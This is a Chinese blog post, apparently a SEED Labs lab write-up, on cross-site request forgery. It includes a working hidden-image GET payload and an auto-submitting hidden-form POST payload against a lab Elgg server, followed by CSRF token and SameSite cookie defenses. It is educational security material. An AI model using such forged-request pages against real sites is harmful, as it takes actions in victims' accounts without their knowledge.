@@ -1,0 +1,185 @@
+---
+title: SEED 实验：深入解剖 CSRF 漏洞原理与防御实践
+description: >-
+  本文通过 SEED Labs 实验环境，深入探讨了跨站请求伪造（CSRF）的攻击原理，涵盖 GET 与 POST 类型攻击的实现细节，并对比分析了 CSRF
+  Token 与 SameSite Cookie 等主流防御方案。
+pubDate: '2025-03-16T12:00:00.000Z'
+image: /images/uploads/curricular-web-csrf-class4-csrf-cover.jpg
+badge: Lab
+draft: false
+categories:
+  - CS
+  - Security
+tags:
+  - CSRF
+  - Web安全
+  - SEED Labs
+  - 网络安全
+  - Cookie
+  - HTTP
+---
+
+> **[迁移说明]** 本文最初发布于 `blog.zzw4257.cn`，现已迁移并在本站进行结构化整理与增强。
+
+
+## 第一章：解剖 Web 通信 —— CSRF 的“作案现场”
+
+### 1. 什么是 CSRF？
+
+在进入代码之前，我们先通过一个生活化的例子来理解 CSRF（Cross-Site Request Forgery）。
+
+*   **场景**：你刚去银行取了钱，银行柜员认识你（因为你出示了身份证），并且给你发了一个**VIP 手环**（代表你的身份）。
+*   **正常情况**：你戴着手环去柜台说“转账 100 给小明”，柜员看到手环，确认是你，操作转账。
+*   **CSRF 攻击**：
+    1.  坏人（攻击者）无法拿到你的手环（他没法直接登录你的账户）。
+    2.  坏人做了一个假的“抽奖箱”（恶意网站），里面藏了一张纸条，写着“转账 100 给坏人”。
+    3.  坏人诱骗你去摸抽奖箱。
+    4.  **关键点**：当你摸抽奖箱时，你的手（浏览器）实际上是拿着那张纸条递给了银行柜员。
+    5.  因为你手上还戴着**VIP 手环**，柜员看到手环，以为是你自愿的，于是把钱转走了。
+
+**核心概念**：攻击者盗用了你的**身份凭证（Cookie/Session）**，以你的名义发送了你并不知情的请求。
+
+---
+
+### 2. 实验环境中的“角色”
+
+在 SEED 实验中，我们需要理清三个 IP 和域名的关系：
+
+1.  **受害者 (Alice)**：坐在浏览器前的用户。已经登录了社交网站，浏览器里存着有效的 Cookie。
+2.  **受信任的服务器 (Trusted Server)**：`www.seed-server.com` (IP: 10.9.0.5)。运行 Elgg (类似 Facebook 的社交软件)。
+3.  **恶意服务器 (Attacker Server)**：`www.attacker32.com` (IP: 10.9.0.105)。存放恶意网页（包含攻击代码），诱骗受害者访问。
+
+---
+
+### 3. 硬核基础知识：HTTP 协议解剖
+
+要完成 CSRF 实验，必须看懂 HTTP 报文。这是 Web 安全的原子层面。
+
+#### 3.1 HTTP 请求的“骨架”
+
+Web 就像寄信。浏览器给服务器写信，服务器回信。一封标准的“请求信”（HTTP Request）结构如下：
+
+```http
+POST /action/profile/edit HTTP/1.1      <-- 1. 请求行 (Request Line)
+Host: www.seed-server.com               <-- 2. 请求头 (Headers)
+User-Agent: Mozilla/5.0 ...
+Cookie: Elgg=p0dci8baqrl4i2ipv2mio3po05 <-- 重点！身份标识
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+name=Alice&description=HackerWasHere    <-- 3. 请求体 (Body) - 仅限 POST
+```
+
+#### 3.2 身份的证明：Cookie 与 Session
+
+HTTP 协议是**无状态**的。服务器通过 **Cookie + Session 机制**来识别用户：
+
+1.  **登录时**：服务器验证通过后，在响应头里命令浏览器：`Set-Cookie: Elgg=p0dci...`。
+2.  **之后每次请求**：只要是访问该域名，浏览器**自动**在请求头里带上对应的 `Cookie`。
+3.  **服务器端验证**：服务器收到请求，提取 Cookie 里的 ID 验证身份。这是 CSRF 能够成功的**根本原因**。
+
+---
+
+## 第二章：GET 请求攻击 —— 欺骗浏览器的本能
+
+### 1. 侦察阶段：解剖“加好友”请求
+
+在写攻击代码前，我们通过 HTTP Header Live 插件提取“攻击配方”：
+
+*   **URL**: `http://www.seed-server.com/action/friends/add`
+*   **HTTP 方法**: `GET`
+*   **关键参数**: `friend=59` (攻击者 Samy 的 ID)。
+
+### 2. 武器化：利用 `<img>` 标签发动攻击
+
+HTML 标准规定，浏览器遇到 `<img>` 标签时，必须尝试加载 `src` 属性里的链接。浏览器不会预先检查该链接是否真的是图片，或是否会产生副作用。
+
+**攻击代码示例：**
+
+```html
+<!-- 这是一个陷阱页面 (add_friend.html) -->
+<html>
+<body>
+  <h1>恭喜！你中奖了！</h1>
+  <!-- 攻击载荷 (Payload) -->
+  <img src="http://www.seed-server.com/action/friends/add?friend=59" 
+       width="1" height="1" 
+       style="display:none;">
+</body>
+</html>
+```
+
+> **注意**：现代浏览器引入了 SameSite Cookie 策略。如果实验中攻击失败，可能是因为浏览器拒绝在跨站子请求中发送 Cookie。
+
+---
+
+## 第三章：POST 请求攻击 —— JavaScript 的“隐形手”
+
+### 1. 为什么 `<img>` 标签失效了？
+
+通常修改数据（如编辑个人资料）的操作设计为只接受 **POST** 请求。POST 请求的数据位于消息体（Body）中，`<img>` 标签无法构造此类请求。此时需要借助 JavaScript。
+
+### 2. 武器化：构建“隐形表单”
+
+我们在恶意网页中创建一个隐形的表单，并在页面加载时利用脚本自动提交。
+
+```html
+<html>
+<body onload="forge_post()">
+<script type="text/javascript">
+function forge_post()
+{
+    var fields = "";
+    fields += "<input type='hidden' name='name' value='Alice'>";
+    fields += "<input type='hidden' name='description' value='Samy is my Hero'>";
+    fields += "<input type='hidden' name='accesslevel[description]' value='2'>"; 
+    fields += "<input type='hidden' name='guid' value='42'>";
+
+    var p = document.createElement("form");
+    p.action = "http://www.seed-server.com/action/profile/edit";
+    p.innerHTML = fields;
+    p.method = "post";
+
+    document.body.appendChild(p);
+    p.submit();
+}
+</script>
+</body>
+</html>
+```
+
+**深度思考**：攻击者虽然不能通过脚本读取受害者的 Cookie（受同源策略 SOP 限制），但 SOP 并不能阻止脚本**发送**跨站请求。这就是 CSRF 防御的难点所在。
+
+---
+
+## 第四章：防御的艺术 —— 令牌与 Cookie 的战争
+
+### 1. 秘密令牌 (CSRF Token) 防御
+
+服务器在 HTML 表单中嵌入一个随机生成的、不可预测的 Token。服务器验证请求时，会检查该 Token 是否与 Session 中存储的匹配。
+
+*   **防御原理**：由于同源策略，运行在 `attacker32.com` 上的脚本无法读取 `seed-server.com` 页面内的隐藏 Token。因此，攻击者无法构造出合法的请求包。
+
+### 2. 浏览器的自我修养：SameSite Cookie
+
+通过为 Cookie 设置 `SameSite` 属性，让浏览器决定是否在跨站请求中携带 Cookie：
+
+| 属性值 | 行为描述 |
+| :--- | :--- |
+| **Strict** | 任何跨站请求都不会发送 Cookie。安全性最高，但可能影响用户体验。 |
+| **Lax** | 仅在顶级导航（如点击链接跳转）时发送 Cookie，而在 `<img>`、`<iframe>` 或 POST 表单提交时不发送。现代浏览器默认设置。 |
+| **None** | 无论是否跨站都会发送 Cookie（需配合 Secure 属性）。 |
+
+### 3. 通信协议的抽象化防御
+
+在更高级的场景中，可以将通信过程抽象为签名机制：
+
+1.  **注册阶段**：用户向服务器注册公钥 (pk)。
+2.  **请求阶段**：客户端使用私钥 (sk) 对请求数据（包含随机数 nonce、时间戳和消息内容）进行签名。
+3.  **验证阶段**：服务器通过 pk 验证签名，确保请求的**唯一性、完整性和不可重放性**。
+
+### 总结
+
+*   **GET CSRF** 利用了浏览器加载资源的本能。
+*   **POST CSRF** 利用了脚本自动提交表单的能力。
+*   **防御核心**在于打破攻击者的“盲发”状态（如使用随机 Token）或限制 Cookie 的跨站传递（如 SameSite 属性）。
